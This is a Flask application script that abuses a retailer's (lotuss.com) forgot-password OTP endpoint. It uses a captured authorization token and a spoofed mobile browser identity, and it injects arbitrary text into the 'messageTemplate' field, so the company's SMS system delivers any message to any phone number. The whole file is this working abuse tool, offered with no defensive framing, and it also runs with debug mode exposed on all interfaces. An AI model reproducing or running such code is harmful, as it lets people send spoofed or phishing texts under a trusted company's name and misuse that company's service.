    
@app.route('/')
def index():
    return render_template('index.html')

xcrid = None
auth = None

@app.route('/api/savesmsvalues', methods=['POST'])
def save_sms_values():
    global xcrid, auth
    data = request.json
    xcrid = data.get('xcrid')
    auth = data.get('auth')
    return jsonify({'success': 'SMS values saved successfully.'}), 200


@app.route('/api/sendsmsmessage', methods=['POST'])
def sendsms_message():
    th = "66"
    data = request.json
    mobile_number = data.get('phone')
    message = data.get('message')
    
    if not mobile_number or not message:
        return jsonify({'error': 'Mobile number and message are required.'}), 400
    
    if xcrid is None or auth is None:
        return jsonify({'error': 'SMS values not set.'}), 400
    
    x = th + mobile_number[1::]
    url = 'https://shoponline-bffapi.lotuss.com/bff/customer/v1/customers/login/forget-password/send-otp'
    lotus_headers = {
        "authorization": f"{auth}",
        "content-type": "application/json",
        "host": "shoponline-bffapi.lotuss.com",
        "origin": "https://www.lotuss.com",
        "referer": "https://www.lotuss.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; MED-LX9; HMSCore 6.11.0.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 HuaweiBrowser/11.0.2.301 Mobile Safari/537.36",
        "x-correlation-id": f"{xcrid}"
    }
    
    lotus2_payload = {
        "messageTemplate": "{message}{{OTP}} (Ref. {{RefCode}}) ",
        "mobileNumber": f"{x}"
    }
    lotus2_payload["messageTemplate"] = lotus2_payload["messageTemplate"].format(message=message)
    
    response = requests.post(url, headers=lotus_headers, json=lotus2_payload)
    if response.ok:
        return jsonify({'success': 'SMS message sent successfully.'}), 200
    else:
        return jsonify({'error': 'Failed to send SMS message.'}), response.status_code



if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)

